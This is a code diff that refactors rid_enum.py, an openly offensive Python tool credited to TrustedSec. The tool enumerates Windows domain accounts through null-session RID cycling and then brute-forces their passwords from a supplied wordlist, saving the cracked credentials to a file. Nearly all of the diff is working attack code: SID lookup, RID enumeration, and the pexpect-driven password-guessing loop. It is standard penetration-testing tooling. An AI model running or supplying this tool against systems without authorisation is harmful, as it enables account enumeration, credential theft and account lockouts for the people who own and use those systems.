@@ -18,6 +18,37 @@ import sys
 #############################################################################################################
 
 
+def usage():
+    print """
+.______       __   _______         _______ .__   __.  __    __  .___  ___.
+|   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   |
+|  |_)  |    |  | |  .--.  |      |  |__   |   \|  | |  |  |  | |  \  /  |
+|      /     |  | |  |  |  |      |   __|  |  . `  | |  |  |  | |  |\/|  |
+|  |\  \----.|  | |  '--'  |      |  |____ |  |\   | |  `--'  | |  |  |  |
+| _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__|
+                            |______|
+
+Written by: David Kennedy (ReL1K)
+Company: https://www.trustedsec.com
+Twitter: @TrustedSec
+Twitter: @Dave_ReL1K
+
+Rid Enum is a RID cycling attack that attempts to enumerate user accounts through
+null sessions and the SID to RID enum. If you specify a password file, it will
+automatically attempt to brute force the user accounts when its finished enumerating.
+
+- RID_ENUM is open source and uses all standard python libraries minus python-pexpect. -
+
+You can also specify an already dumped username file, it needs to be in the DOMAINNAME\USERNAME
+format.
+
+Example: ./rid_enum.py 192.168.1.50 500 50000 /root/dict.txt
+
+Usage: ./rid_enum.py <server_ip> <start_rid> <end_rid> <optional_password_file> <optional_username_filename>
+"""
+    sys.exit()
+
+
 # attempt to use lsa query first
 def check_user_lsa(ip):
     # pull the domain via lsaenum
@@ -81,8 +112,10 @@ def sids_to_names(ip, sid, start, stop):
     return rid_accounts
 
 # capture initial input
-success = ""
+success = False
 try:
+    if len(sys.argv) < 4:
+        usage()
     ip = sys.argv[1]
     rid_start = sys.argv[2]
     rid_stop = sys.argv[3]
@@ -90,49 +123,39 @@ try:
     passwords = ""
     # if we use userlist
     userlist = ""
-    try:
+    if len(sys.argv) > 4:
         # pull in password file
         passwords = sys.argv[4]
         # if its not there then bomb out
         if not os.path.isfile(passwords):
             print "[!] File was not found. Please try a path again."
             sys.exit()
-
-    except IndexError:
-        pass
-
-    try:
+    if len(sys.argv) > 5:
         userlist = sys.argv[5]
         if not os.path.isfile(userlist):
             print "[!] File was not found. Please try a path again."
             sys.exit()
 
-    except IndexError:
-        pass
-
     # check for python pexpect
     try:
         import pexpect
-
     # if we don't have it
     except ImportError:
         print "[!] Sorry boss, python-pexpect is not installed. You need to install this first."
         sys.exit()
 
     # if userlist is being used versus rid enum, then skip all of this
-    if userlist == "":
+    if not userlist:
         print "[*] Attempting lsaquery first...This will enumerate the base domain SID"
         # call the check_user_lsa function and check to see if we can find base SID guid
         sid = check_user_lsa(ip)
         # if lsa enumeration was successful then don't do
         if sid:
-            if sid != "":
-                print "[*] Successfully enumerated base domain SID.. Moving on to extract via RID"
-                # format it properly
-                sid = sid.rstrip()
-                sid = sid.split(" ")
-                sid = sid[4]
-
+            print "[*] Successfully enumerated base domain SID.. Moving on to extract via RID"
+            # format it properly
+            sid = sid.rstrip()
+            sid = sid.split(" ")
+            sid = sid[4]
         # if we weren't successful on lsaquery
         else:
             print "[!] Unable to enumerate through lsaquery, trying default account names.."
@@ -144,13 +167,9 @@ try:
                 if not sid:
                     print "[!] Failed using account name: %s...Attempting another." % account
                 else:
-                    if sid != "":
-                        # success! Break out of the loop
-                        print "[*] Successfully enumerated SID account.. Moving on to extract via RID.\n"
-                        break
-                    else:
-                        print "[!] Failed. Access is denied. Sorry boss."
-                        sys.exit()
+                    # success! Break out of the loop
+                    print "[*] Successfully enumerated SID account.. Moving on to extract via RID.\n"
+                    break
 
             # pulling the exact domain SID out
             sid = sid.split(" ")
@@ -187,18 +206,16 @@ try:
         print "[*] Finished enumerating user accounts... Seemed to be successful."
 
     # if we specified a password list
-    if passwords != "":
+    if passwords:
         # our password file
         passfile = file(passwords, "r").readlines()
-
         userfile = ""
         # if userlist was specified
-        if userlist != "":
+        if userlist:
             # use the userlist specified
             userfile = file(userlist, "r").readlines()
-
         # our list of users
-        if userlist == "":
+        else:
             userfile = file("%s_users.txt" % ip, "r").readlines()
 
         # write out the files upon success
@@ -235,7 +252,7 @@ try:
                         print "[*] Successfully guessed username: %s with password of: %s" % (user, password)
                         filewrite.write("username: %s password: %s\n" % (user, password))
                         filewrite.close()
-                        success = "1"
+                        success = True
                         child.kill(0)
 
                     # if account expired
@@ -244,7 +261,7 @@ try:
                               however, it is set to expired." % (user, password)
                         filewrite.write("username: %s password: %s\n" % (user, password))
                         filewrite.close()
-                        success = "1"
+                        success = True
                         child.kill(0)
 
                     # if account is locked out
@@ -252,15 +269,13 @@ try:
                         print "[!] Careful. Received a NT_STATUS_ACCOUNT_LOCKED_OUT was detected.. \
                                You may be locking accounts out!"
                         child.kill(0)
-
-        # if we weren't successful
-        if success == "":
-            print "\n[!] Unable to brute force a user account, sorry boss."
-
         # if we got lucky
-        if success != "":
+        if success:
             print "[*] We got some accounts, exported results to %s_success_results_txt" % ip
             print "[*] All accounts extracted via RID cycling have been exported to %s_users.txt" % ip
+        # if we weren't successful
+        else:
+            print "\n[!] Unable to brute force a user account, sorry boss."
 
     # exit out after we are finished
     sys.exit()
@@ -268,36 +283,3 @@ try:
 # except keyboard interrupt
 except KeyboardInterrupt:
     print "[*] Okay, Okay... Exiting... Thanks for using rid_enum.py"
-
-# except indexerror
-# this is dangerous, should consider changing. It "bubbles" up to the other functions
-except IndexError, e:
-
-    print """
-.______       __   _______         _______ .__   __.  __    __  .___  ___. 
-|   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   | 
-|  |_)  |    |  | |  .--.  |      |  |__   |   \|  | |  |  |  | |  \  /  | 
-|      /     |  | |  |  |  |      |   __|  |  . `  | |  |  |  | |  |\/|  | 
-|  |\  \----.|  | |  '--'  |      |  |____ |  |\   | |  `--'  | |  |  |  | 
-| _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__| 
-                            |______|                                       
-
-Written by: David Kennedy (ReL1K)
-Company: https://www.trustedsec.com
-Twitter: @TrustedSec
-Twitter: @Dave_ReL1K
-
-Rid Enum is a RID cycling attack that attempts to enumerate user accounts through 
-null sessions and the SID to RID enum. If you specify a password file, it will 
-automatically attempt to brute force the user accounts when its finished enumerating.
-
-- RID_ENUM is open source and uses all standard python libraries minus python-pexpect. -
-
-You can also specify an already dumped username file, it needs to be in the DOMAINNAME\USERNAME 
-format.
-
-Example: ./rid_enum.py 192.168.1.50 500 50000 /root/dict.txt
-
-Usage: ./rid_enum.py <server_ip> <start_rid> <end_rid> <optional_password_file> <optional_username_filename>
-"""
-    sys.exit()
